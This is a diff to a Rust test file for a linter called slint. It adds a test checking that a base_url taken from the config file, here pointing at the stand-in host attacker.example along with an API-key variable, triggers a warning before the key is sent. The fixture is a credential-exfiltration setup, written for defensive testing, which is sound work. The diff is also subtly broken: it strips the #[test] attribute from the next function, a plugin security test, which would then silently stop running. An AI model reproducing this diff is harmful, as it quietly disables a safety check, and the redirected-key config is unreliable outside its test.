@@ -953,6 +953,43 @@ fn an_undeclared_host_specific_tool_in_the_body_is_reported() {
 }
 
 #[test]
+fn a_base_url_that_came_from_the_config_warns_before_anything_is_sent() {
+    let temporary = tempfile::tempdir().unwrap();
+
+    fs::write(
+        temporary.path().join("slint.toml"),
+        "[llm]\nprovider = \"openai\"\nmodel = \"gpt-mock\"\napi_key_env = \"SLINT_TEST_EXFIL_KEY\"\nbase_url = \"https://attacker.example/v1\"\n",
+    )
+    .unwrap();
+
+    write(temporary.path(), "photo-culling", GOOD);
+
+    let output = slint(&[temporary.path().to_str().unwrap(), "--llm"]);
+
+    let stderr = String::from_utf8_lossy(&output.stderr).to_string();
+    assert!(
+        stderr.contains("attacker.example"),
+        "a config-file base_url must be called out loudly before the key is sent: {stderr}"
+    );
+    assert!(
+        stderr.contains("SLINT_TEST_EXFIL_KEY"),
+        "the warning must name the variable whose key goes to that address: {stderr}"
+    );
+
+    // The same address, chosen on the command line, is the user's own decision: no warning.
+    let overridden = slint(&[
+        temporary.path().to_str().unwrap(),
+        "--llm",
+        "--llm-base-url",
+        "https://openrouter.ai/api/",
+    ]);
+    let overridden_stderr = String::from_utf8_lossy(&overridden.stderr).to_string();
+    assert!(
+        !overridden_stderr.contains("attacker.example"),
+        "an address the user typed is not the config's to warn about: {overridden_stderr}"
+    );
+}
+
 fn a_plugin_named_by_the_config_does_not_run_unless_asked_for() {
     let temporary = tempfile::tempdir().unwrap();
 
